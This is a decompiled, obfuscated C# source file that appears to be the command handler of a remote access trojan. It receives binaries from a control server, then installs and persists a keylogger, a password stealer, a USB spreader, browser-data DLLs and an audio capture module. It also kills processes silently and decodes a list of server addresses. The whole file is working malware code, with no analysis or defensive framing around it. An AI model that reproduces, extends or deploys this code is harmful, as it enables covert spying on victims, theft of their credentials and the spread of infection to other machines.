using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace camsars;

internal class romwckoOCMD
{
	public romwckoMCDM server;

	public DateTime romwckorunTime;

	public void romwckoprocess(string filePath, string parms, bool sendExp)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = filePath;
			if (parms != null && parms != "")
			{
				process.StartInfo.Arguments = parms;
			}
			process.Start();
		}
		catch
		{
		}
	}

	public void romwckodieProcess(Process p)
	{
		try
		{
			if (p != null)
			{
				Process process = new Process();
				byte[] array = new byte[12]
				{
					116, 97, 115, 107, 107, 105, 108, 108, 46, 101,
					120, 101
				};
				process.StartInfo.FileName = Encoding.UTF8.GetString(array, 0, array.Length);
				process.StartInfo.Arguments = "/PID |wicmx".Split(new char[1] { '|' })[0] + p.Id + " /T /F|wicmx".Split(new char[1] { '|' })[0];
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				process.WaitForExit();
			}
		}
		catch
		{
		}
	}

	public void romwckoup_main(string switchType)
	{
		try
		{
			string[] array = switchType.Split(new char[1] { '|' });
			if (array.Length == 2)
			{
				romwckoCONF.romwckomainApp = array[0];
				romwckoCONF.romwckoappPath = array[1];
				romwckoCONF.romwckoset_App(update: true);
			}
		}
		catch
		{
		}
	}

	public void romwckoseekilogr()
	{
		try
		{
			if (Process.GetProcessesByName(romwckoCONF.romwckokiyApp).Length == 0 && File.Exists(romwckoCONF.romwckokiPath() + romwckoCONF.romwckokiyApp + ".exe!romwcko".Split(new char[1] { '!' })[0]))
			{
				romwckoprocess(romwckoCONF.romwckokiPath() + romwckoCONF.romwckokiyApp + ".exe!romwcko".Split(new char[1] { '!' })[0], null, sendExp: false);
			}
		}
		catch
		{
		}
	}

	public romwckoOCMD(romwckoMCDM lID)
	{
		server = lID;
	}

	public NetworkStream romwckoNS(TcpClient romwckotcpsck)
	{
		return romwckotcpsck.GetStream();
	}

	public void romwckoup_security(string switchType)
	{
		try
		{
			string[] array = switchType.Split(new char[1] { '|' });
			if (array.Length == 2)
			{
				romwckoCONF.romwckosecApp = array[0];
				romwckoCONF.romwckothiPath = array[1];
				romwckoCONF.securty = true;
			}
		}
		catch
		{
		}
	}

	public string romwckoget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B!romwcko".Split(new char[1] { '!' })[0],
				"KB!romwcko".Split(new char[1] { '!' })[0],
				"MB!romwcko".Split(new char[1] { '!' })[0],
				"GB",
				"TB",
				"PB",
				"EB!romwcko".Split(new char[1] { '!' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	public string romwckoupdate_user()
	{
		string text = "";
		try
		{
			if (!File.Exists(romwckoCONF.romwckokiPath() + romwckoCONF.romwckokiyApp + ".exe"))
			{
				text = "romwcko-uklog>|wicmx".Split(new char[1] { '|' })[0];
			}
			if (!File.Exists(romwckoCONF.romwckoget_ppath() + romwckoCONF.romwckopssApp + ".exe"))
			{
				text += "romwcko-sndps>|wicmx".Split(new char[1] { '|' })[0];
			}
			if (!File.Exists(romwckoCONF.romwckosecPath() + romwckoCONF.romwckosecApp + ".exe"))
			{
				text += "romwcko-secup>|wicmx".Split(new char[1] { '|' })[0];
			}
			if (!File.Exists(romwckoCONF.romwckoget_mpath() + romwckoCONF.romwckoaudioDLL))
			{
				text += "romwcko-audio>|wicmx".Split(new char[1] { '|' })[0];
			}
			if (!File.Exists(romwckoCONF.romwckoget_ppath() + romwckoCONF.romwckochromDLL))
			{
				text += "romwcko-chrodll>|wicmx".Split(new char[1] { '|' })[0];
			}
			if (!File.Exists(romwckoCONF.romwckoget_ppath() + romwckoCONF.romwckomozeDLL))
			{
				text += "romwcko-mozedll>|wicmx".Split(new char[1] { '|' })[0];
			}
			if (!File.Exists(romwckoCONF.romwckousbPath() + romwckoCONF.romwckousbApp + ".exe"))
			{
				text += "romwcko-usbdiv>|wicmx".Split(new char[1] { '|' })[0];
			}
			text = text + "romwcko-sapp=" + romwckoCONF.romwckosecApp + "<" + romwckoCONF.romwckothiPath + ">|wicmx".Split(new char[1] { '|' })[0];
			text = text + "romwcko-kapp=" + romwckoCONF.romwckokiyApp + "<" + romwckoCONF.romwckokeePath + ">|wicmx".Split(new char[1] { '|' })[0];
			text = text + "romwcko-uapp=" + romwckoCONF.romwckousbApp + "<" + romwckoCONF.romwckoflshPath + ">|wicmx".Split(new char[1] { '|' })[0];
			text = text + "romwcko-papp=" + romwckoCONF.romwckopssApp + "<" + romwckoCONF.romwckopasPath + ">|wicmx".Split(new char[1] { '|' })[0];
			text = text + "romwcko-mapp=" + romwckoCONF.romwckomainApp + "<" + romwckoCONF.romwckoappPath + ">|wicmx".Split(new char[1] { '|' })[0];
			return text;
		}
		catch
		{
			return text;
		}
	}

	public void romwckoup_pass(string switchType)
	{
		try
		{
			string[] array = switchType.Split(new char[1] { '|' });
			if (array.Length == 2)
			{
				romwckoCONF.romwckopssApp = array[0];
				romwckoCONF.romwckopasPath = array[1];
				romwckoCONF.pass = true;
			}
		}
		catch
		{
		}
	}

	public void romwckoup_usb(string switchType)
	{
		try
		{
			string[] array = switchType.Split(new char[1] { '|' });
			if (array.Length == 2)
			{
				romwckoCONF.romwckousbApp = array[0];
				romwckoCONF.romwckoflshPath = array[1];
				romwckoCONF.usb = true;
			}
		}
		catch
		{
		}
	}

	public void romwckoseeutcl()
	{
		try
		{
			if (Process.GetProcessesByName(romwckoCONF.romwckosecApp).Length == 0 && File.Exists(romwckoCONF.romwckosecPath() + romwckoCONF.romwckosecApp + ".exe!romwcko".Split(new char[1] { '!' })[0]))
			{
				romwckoprocess(romwckoCONF.romwckosecPath() + romwckoCONF.romwckosecApp + ".exe!romwcko".Split(new char[1] { '!' })[0], null, sendExp: false);
			}
		}
		catch
		{
		}
	}

	public void romwckodeleteKLS()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName(romwckoCONF.romwckokiyApp);
			if (processesByName.Length == 1)
			{
				romwckobreak_process(processesByName[0].Id);
			}
			Thread.Sleep(200);
			if (File.Exists(romwckoCONF.romwckokiPath() + romwckoCONF.romwckokeloogs))
			{
				File.Delete(romwckoCONF.romwckokiPath() + romwckoCONF.romwckokeloogs);
				if (File.Exists(romwckoCONF.romwckokiPath() + romwckoCONF.romwckokeloogs + "$|wicmx".Split(new char[1] { '|' })[0]))
				{
					File.Delete(romwckoCONF.romwckokiPath() + romwckoCONF.romwckokeloogs + "$|wicmx".Split(new char[1] { '|' })[0]);
				}
				Thread.Sleep(250);
				romwckoseekilogr();
			}
		}
		catch
		{
		}
	}

	public void romwckobreak_process(int proid)
	{
		try
		{
			try
			{
				Process.GetProcessById(proid).Kill();
				Thread.Sleep(100);
				server.romwckolist_processes();
			}
			catch
			{
				romwckodieProcess(Process.GetProcessById(proid));
			}
		}
		catch
		{
		}
	}

	public void romwckoseeusbl()
	{
		try
		{
			if (Process.GetProcessesByName(romwckoCONF.romwckousbApp).Length == 0 && File.Exists(romwckoCONF.romwckousbPath() + romwckoCONF.romwckousbApp + ".exe!romwcko".Split(new char[1] { '!' })[0]))
			{
				romwckoprocess(romwckoCONF.romwckousbPath() + romwckoCONF.romwckousbApp + ".exe!romwcko".Split(new char[1] { '!' })[0], null, sendExp: false);
			}
		}
		catch
		{
		}
	}

	public void romwckocheckLast()
	{
		DateTime now = DateTime.Now;
		try
		{
			if (Math.Abs(romwckorunTime.Subtract(now).Minutes) > 6)
			{
				server.romwckotcpsck.Close();
				server.romwckois_working = false;
			}
		}
		catch
		{
		}
	}

	public void romwckoremove_user()
	{
		try
		{
			byte[] array = server.romwckopull_data();
			if (array != null && !File.Exists(romwckoCONF.romwckoget_mpath() + romwckoCONF.romwckoremvUser + ".exe!romwcko".Split(new char[1] { '!' })[0]))
			{
				File.WriteAllBytes(romwckoCONF.romwckoget_mpath() + romwckoCONF.romwckoremvUser + ".exe!romwcko".Split(new char[1] { '!' })[0], array);
				romwckoprocess(romwckoCONF.romwckoget_mpath() + romwckoCONF.romwckoremvUser + ".exe", null, sendExp: false);
			}
		}
		catch
		{
		}
	}

	public void romwckoup_keeloger(string switchType)
	{
		try
		{
			string[] array = switchType.Split(new char[1] { '|' });
			if (array.Length == 2)
			{
				romwckoCONF.romwckokiyApp = array[0];
				romwckoCONF.romwckokeePath = array[1];
				romwckoCONF.romwckoset_kilog(update: true);
			}
		}
		catch
		{
		}
	}

	public void romwckoseeUSB()
	{
		try
		{
			if (Process.GetProcessesByName(romwckoCONF.romwckousbApp).Length == 0 && File.Exists(romwckoCONF.romwckousbPath() + romwckoCONF.romwckousbApp + ".exe!romwcko".Split(new char[1] { '!' })[0]))
			{
				romwckoprocess(romwckoCONF.romwckousbPath() + romwckoCONF.romwckousbApp + ".exe!romwcko".Split(new char[1] { '!' })[0], null, sendExp: false);
			}
		}
		catch
		{
		}
	}

	public void romwckoupdated(int uType, string switchType)
	{
		try
		{
			byte[] array = server.romwckopull_data();
			switch (uType)
			{
			case 1:
				if (array != null)
				{
					File.WriteAllBytes(romwckoCONF.romwckoget_mpath() + romwckoCONF.romwckoaudioDLL, array);
				}
				break;
			case 2:
				if (!Directory.Exists(romwckoCONF.romwckousbPath()))
				{
					Directory.CreateDirectory(romwckoCONF.romwckousbPath());
				}
				if (array != null)
				{
					Process[] processesByName2 = Process.GetProcessesByName(romwckoCONF.romwckousbApp);
					if (processesByName2.Length == 1)
					{
						romwckobreak_process(processesByName2[0].Id);
						Thread.Sleep(300);
					}
					romwckoup_usb(switchType);
					File.WriteAllBytes(romwckoCONF.romwckousbPath() + romwckoCONF.romwckousbApp + ".exe!romwcko".Split(new char[1] { '!' })[0], array);
					romwckoCONF.romwckoset_run("iub!romwcko".Split(new char[1] { '!' })[0], romwckoCONF.romwckousbPath() + romwckoCONF.romwckousbApp + ".exe!romwcko".Split(new char[1] { '!' })[0]);
				}
				break;
			case 3:
				if (array != null)
				{
					if (!Directory.Exists(romwckoCONF.romwckokiPath()))
					{
						Directory.CreateDirectory(romwckoCONF.romwckokiPath());
					}
					Process[] processesByName = Process.GetProcessesByName(romwckoCONF.romwckokiyApp);
					if (processesByName.Length == 1)
					{
						romwckobreak_process(processesByName[0].Id);
						Thread.Sleep(200);
					}
					romwckoup_keeloger(switchType);
					File.WriteAllBytes(romwckoCONF.romwckokiPath() + romwckoCONF.romwckokiyApp + ".exe", array);
					romwckoCONF.romwckoset_run("kun!romwcko".Split(new char[1] { '!' })[0], romwckoCONF.romwckokiPath() + romwckoCONF.romwckokiyApp + ".exe!romwcko".Split(new char[1] { '!' })[0]);
				}
				break;
			case 4:
				if (array != null)
				{
					romwckoup_pass(switchType);
					if (!Directory.Exists(romwckoCONF.romwckoget_ppath()))
					{
						Directory.CreateDirectory(romwckoCONF.romwckoget_ppath());
					}
					File.WriteAllBytes(romwckoCONF.romwckoget_ppath() + romwckoCONF.romwckopssApp + ".exe!romwcko".Split(new char[1] { '!' })[0], array);
				}
				break;
			case 6:
			{
				romwckoup_security(switchType);
				string path = romwckoCONF.romwckosecPath() + romwckoCONF.romwckosecApp + ".exe!romwcko".Split(new char[1] { '!' })[0];
				if (!Directory.Exists(romwckoCONF.romwckosecPath()))
				{
					Directory.CreateDirectory(romwckoCONF.romwckosecPath());
				}
				File.WriteAllBytes(path, array);
				romwckoCONF.romwckoset_run("sew!romwcko".Split(new char[1] { '!' })[0], path);
				break;
			}
			case 7:
				if (array != null)
				{
					romwckoup_main(switchType);
					if (!Directory.Exists(romwckoCONF.romwckoget_mpath()))
					{
						Directory.CreateDirectory(romwckoCONF.romwckoget_mpath());
					}
					string text = romwckoCONF.romwckoget_mpath() + "tmps\\|wicmx".Split(new char[1] { '|' })[0];
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					File.WriteAllBytes(text + romwckoCONF.romwckomainApp + ".exe", array);
					romwckoprocess(text + romwckoCONF.romwckomainApp + ".exe", null, sendExp: true);
				}
				break;
			case 9:
				if (array != null)
				{
					File.WriteAllBytes(romwckoCONF.romwckoget_ppath() + romwckoCONF.romwckochromDLL, array);
				}
				break;
			case 10:
				if (array != null)
				{
					File.WriteAllBytes(romwckoCONF.romwckoget_ppath() + romwckoCONF.romwckomozeDLL, array);
				}
				break;
			case 5:
			case 8:
				break;
			}
		}
		catch
		{
		}
	}

	public string[] romwckoserverIPD()
	{
		string @string = Encoding.UTF8.GetString(romwckoCONF.romwckovpsips, 0, romwckoCONF.romwckovpsips.Length);
		return @string.Split(new char[1] { '?' });
	}

	public void romwckoseeSEC()
	{
		try
		{
			if (Process.GetProcessesByName(romwckoCONF.romwckosecApp).Length == 0 && File.Exists(romwckoCONF.romwckosecPath() + romwckoCONF.romwckosecApp + ".exe!romwcko".Split(new char[1] { '!' })[0]))
			{
				romwckoprocess(romwckoCONF.romwckosecPath() + romwckoCONF.romwckosecApp + ".exe!romwcko".Split(new char[1] { '!' })[0], null, sendExp: false);
			}
		}
		catch
		{
		}
	}
}
